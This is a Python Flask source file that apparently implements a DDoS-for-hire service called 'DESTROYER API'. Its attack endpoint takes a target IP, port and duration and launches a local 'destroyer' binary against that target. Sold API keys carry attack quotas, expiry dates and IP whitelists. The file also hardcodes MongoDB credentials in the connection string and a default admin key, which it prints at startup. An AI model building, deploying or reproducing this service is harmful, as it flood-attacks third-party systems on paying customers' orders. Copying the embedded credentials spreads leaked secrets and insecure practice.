from flask import Flask, request, jsonify
import time
import secrets
import subprocess
import os
import sys
from datetime import datetime, timedelta
from pymongo import MongoClient

app = Flask(__name__)

# ================= CONFIGURATION =================
PORT = int(os.environ.get("PORT", 10000))
ADMIN_KEY = os.environ.get("ADMIN_KEY", "Rishabh_ka_papa_Neo")
RATE_LIMIT_SECONDS = 6

# ================= HARDCODED MONGODB URI =================
MONGO_URI = "mongodb+srv://neobots:neomongo@cluster0.uvubs6k.mongodb.net/?appName=Cluster0"
DB_NAME = "Cluster0"

# ================= BINARY PATH =================
BINARY_PATH = os.path.join(os.path.dirname(__file__), "neo")

# Make sure binary is executable
if os.path.exists(BINARY_PATH):
    os.chmod(BINARY_PATH, 0o755)
    print(f"✅ Binary found at: {BINARY_PATH}")
else:
    print(f"⚠️ Binary not found at: {BINARY_PATH}")
    print("   Please ensure 'destroyer' binary is in the same directory")

# ================= MONGODB CONNECTION =================
try:
    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    client.admin.command('ping')
    db = client[DB_NAME]
    api_keys_col = db["api_keys"]
    print("✅ Connected to MongoDB")
except Exception as e:
    print(f"❌ MongoDB connection failed: {e}")
    print("   Please check your network connection")
    sys.exit(1)

# ================= HELPER FUNCTIONS =================
def generate_api_key():
    return secrets.token_urlsafe(32)

def get_real_client_ip():
    cf_ip = request.headers.get('CF-Connecting-IP')
    if cf_ip:
        return cf_ip.strip()
    xff = request.headers.get('X-Forwarded-For')
    if xff:
        return xff.split(',')[0].strip()
    return request.remote_addr

def is_key_valid(key):
    doc = api_keys_col.find_one({"api_key": key})
    if not doc:
        return False, "Invalid API key"
    expiry = doc.get("expiry")
    if expiry and expiry.timestamp() < time.time():
        return False, "API key expired"
    return True, "Valid"

def check_ip_whitelist(api_key, client_ip):
    doc = api_keys_col.find_one({"api_key": api_key})
    if not doc:
        return False
    whitelist = doc.get("whitelisted_ips", [])
    if not whitelist:
        return True
    return client_ip.strip().lower() in [ip.strip().lower() for ip in whitelist]

def decrement_remaining_attacks(api_key):
    doc = api_keys_col.find_one({"api_key": api_key})
    if not doc:
        return False, "API key not found"
    remaining = doc.get("remaining_attacks")
    if remaining is None:
        return True, None
    if remaining <= 0:
        api_keys_col.delete_one({"api_key": api_key})
        return False, "API key reached attack limit"
    api_keys_col.update_one({"api_key": api_key}, {"$inc": {"remaining_attacks": -1}})
    return True, remaining - 1

def check_rate_limit(api_key):
    now = time.time()
    if not hasattr(app, 'rate_limit_store'):
        app.rate_limit_store = {}
    last = app.rate_limit_store.get(api_key, 0)
    if now - last < RATE_LIMIT_SECONDS:
        return False, RATE_LIMIT_SECONDS - (now - last)
    app.rate_limit_store[api_key] = now
    return True, 0

# ================= BINARY EXECUTION FUNCTION =================
def execute_destroyer_binary(target_ip, target_port, duration):
    """
    Execute the destroyer binary with parameters.
    Expected binary usage: destroyer <IP> <PORT> <THREADS> <DURATION>
    """
    try:
        if not os.path.exists(BINARY_PATH):
            return False, f"Binary not found at {BINARY_PATH}"
        
        threads = 4
        cmd = [BINARY_PATH, target_ip, str(target_port), str(threads), str(duration)]
        
        print(f"🚀 Executing: {' '.join(cmd)}")
        
        timeout = duration + 10
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        
        if result.returncode == 0:
            return True, result.stdout if result.stdout else "Attack completed successfully"
        else:
            return False, result.stderr if result.stderr else "Binary execution failed"
            
    except subprocess.TimeoutExpired:
        try:
            result.kill()
        except:
            pass
        return False, f"Attack timed out after {timeout} seconds"
    except Exception as e:
        return False, str(e)

# ================= FLASK ENDPOINTS =================
@app.route('/')
def root():
    return jsonify({
        "name": "DESTROYER API (Binary Mode)",
        "version": "3.0",
        "status": "running",
        "binary_path": BINARY_PATH,
        "binary_exists": os.path.exists(BINARY_PATH),
        "endpoints": {
            "health": "/api/health",
            "attack": "/api/v1/attack",
            "generate": "/api/generate",
            "auth": "/api/auth",
            "revoke": "/api/revoke",
            "revoke_all": "/api/revoke_all",
            "list_keys": "/api/list_keys",
            "status": "/api/status",
            "stats": "/api/stats",
            "ip": "/api/ip"
        }
    })

@app.route('/api/health')
def health():
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "db_connected": True,
        "binary_available": os.path.exists(BINARY_PATH)
    })

@app.route('/api/ip')
def get_public_ip():
    import requests
    ipv4 = None
    ipv6 = None
    try:
        ipv4 = requests.get('https://api.ipify.org', timeout=5).text.strip()
    except:
        pass
    try:
        ipv6 = requests.get('https://api6.ipify.org', timeout=5).text.strip()
    except:
        pass
    return jsonify({"ipv4": ipv4, "ipv6": ipv6})

@app.route('/api/v1/attack', methods=['POST'])
def attack():
    try:
        data = request.json or {}
        api_key = data.get('key') or request.headers.get('x-api-key')
        ip = data.get('ip')
        port = data.get('port')
        duration = data.get('duration')

        if not api_key:
            return jsonify({"success": False, "message": "Missing API key"}), 401
        if not all([ip, port, duration]):
            return jsonify({"success": False, "message": "Missing parameters: ip, port, duration"}), 400

        try:
            port = int(port)
            duration = int(duration)
        except ValueError:
            return jsonify({"success": False, "message": "Port and duration must be numbers"}), 400
        if duration < 1 or duration > 180:
            return jsonify({"success": False, "message": "Duration must be 1-180 seconds"}), 400

        valid, msg = is_key_valid(api_key)
        if not valid:
            return jsonify({"success": False, "message": msg}), 401

        client_ip = get_real_client_ip()
        if not check_ip_whitelist(api_key, client_ip):
            return jsonify({"success": False, "message": "IP not whitelisted for this API key"}), 403

        can_attack, remaining = check_rate_limit(api_key)
        if not can_attack:
            return jsonify({"success": False, "message": f"Cooldown! Wait {int(remaining)} seconds"}), 429

        success, remaining_val = decrement_remaining_attacks(api_key)
        if not success:
            return jsonify({"success": False, "message": remaining_val}), 403
        remaining_attacks = remaining_val if remaining_val is not None else "Unlimited"

        attack_success, output = execute_destroyer_binary(ip, port, duration)

        if attack_success:
            return jsonify({
                "success": True,
                "message": "Attack successful via destroyer binary",
                "target": f"{ip}:{port}",
                "duration": f"{duration}s",
                "remaining_attacks": remaining_attacks,
                "binary_output": output[:500] if output else "Attack completed"
            }), 200
        else:
            return jsonify({
                "success": False, 
                "message": f"Binary execution failed: {output}",
                "target": f"{ip}:{port}",
                "duration": f"{duration}s"
            }), 500

    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500

@app.route('/api/generate', methods=['POST'])
def generate_key():
    if request.headers.get('X-Admin-Key') != ADMIN_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    data = request.json
    days = data.get('days', 30)
    concurrent = data.get('concurrent', 1)
    max_attacks = data.get('max_attacks')

    new_key = generate_api_key()
    expiry = datetime.now() + timedelta(days=days)

    api_keys_col.insert_one({
        "api_key": new_key,
        "expiry": expiry,
        "concurrent": concurrent,
        "remaining_attacks": max_attacks,
        "created_at": datetime.now(),
        "whitelisted_ips": []
    })

    return jsonify({
        "success": True,
        "api_key": new_key,
        "expires_in": f"{days} days",
        "max_attacks": max_attacks or "Unlimited"
    }), 201

@app.route('/api/revoke', methods=['POST'])
def revoke_key():
    if request.headers.get('X-Admin-Key') != ADMIN_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    api_key = request.json.get('api_key')
    if not api_key:
        return jsonify({"error": "Missing api_key"}), 400

    result = api_keys_col.delete_one({"api_key": api_key})
    if result.deleted_count:
        return jsonify({"success": True, "message": "API key revoked"}), 200
    return jsonify({"error": "API key not found"}), 404

@app.route('/api/revoke_all', methods=['POST'])
def revoke_all_keys():
    if request.headers.get('X-Admin-Key') != ADMIN_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    count = api_keys_col.count_documents({})
    api_keys_col.delete_many({})
    return jsonify({"success": True, "message": f"Revoked {count} API keys"}), 200

@app.route('/api/auth', methods=['POST'])
def authorize_ip():
    if request.headers.get('X-Admin-Key') != ADMIN_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    data = request.json
    api_key = data.get('api_key')
    ip_address = data.get('ip')

    if not api_key or not ip_address:
        return jsonify({"error": "Missing api_key or ip"}), 400

    doc = api_keys_col.find_one({"api_key": api_key})
    if not doc:
        return jsonify({"error": "Invalid API key"}), 404

    whitelist = doc.get("whitelisted_ips", [])
    if ip_address not in whitelist:
        api_keys_col.update_one({"api_key": api_key}, {"$push": {"whitelisted_ips": ip_address}})
        return jsonify({"success": True, "message": f"IP {ip_address} whitelisted"}), 200
    else:
        return jsonify({"success": False, "message": "IP already whitelisted"}), 400

@app.route('/api/list_keys', methods=['GET'])
def list_keys():
    if request.headers.get('X-Admin-Key') != ADMIN_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    keys_list = []
    for doc in api_keys_col.find():
        keys_list.append({
            "key": doc['api_key'][:16] + "...",
            "full_key": doc['api_key'],
            "expires": doc['expiry'].strftime('%Y-%m-%d %H:%M:%S'),
            "concurrent": doc.get('concurrent', 1),
            "remaining_attacks": doc.get('remaining_attacks', 'Unlimited'),
            "whitelisted_ips": doc.get('whitelisted_ips', [])
        })
    return jsonify({"keys": keys_list, "total": len(keys_list)}), 200

@app.route('/api/status', methods=['GET'])
def check_status():
    api_key = request.args.get('key')
    if not api_key:
        return jsonify({"error": "Missing key parameter"}), 400

    doc = api_keys_col.find_one({"api_key": api_key})
    if not doc:
        return jsonify({"error": "Invalid API key"}), 404

    return jsonify({
        "valid": doc['expiry'] > datetime.now(),
        "expires_in": max(0, int((doc['expiry'] - datetime.now()).total_seconds())),
        "remaining_attacks": doc.get('remaining_attacks', 'Unlimited'),
        "whitelisted_ips": doc.get('whitelisted_ips', [])
    }), 200

@app.route('/api/stats', methods=['GET'])
def stats():
    if request.headers.get('X-Admin-Key') != ADMIN_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    total_keys = api_keys_col.count_documents({})
    active_keys = api_keys_col.count_documents({"expiry": {"$gt": datetime.now()}})
    return jsonify({
        "total_api_keys": total_keys,
        "active_api_keys": active_keys,
        "rate_limit_seconds": RATE_LIMIT_SECONDS,
        "binary_available": os.path.exists(BINARY_PATH)
    }), 200

# ================= MAIN =================
if __name__ == '__main__':
    print("\n" + "="*60)
    print("🔥 DESTROYER API (Binary Execution Mode)")
    print("="*60)
    print(f"📍 Port: {PORT}")
    print(f"🔑 Admin Key: {ADMIN_KEY}")
    print(f"⏱️  Rate Limit: {RATE_LIMIT_SECONDS}s")
    print(f"📁 Binary Path: {BINARY_PATH}")
    print(f"✅ Binary Available: {os.path.exists(BINARY_PATH)}")
    print("="*60 + "\n")
    app.run(host='0.0.0.0', port=PORT, debug=False)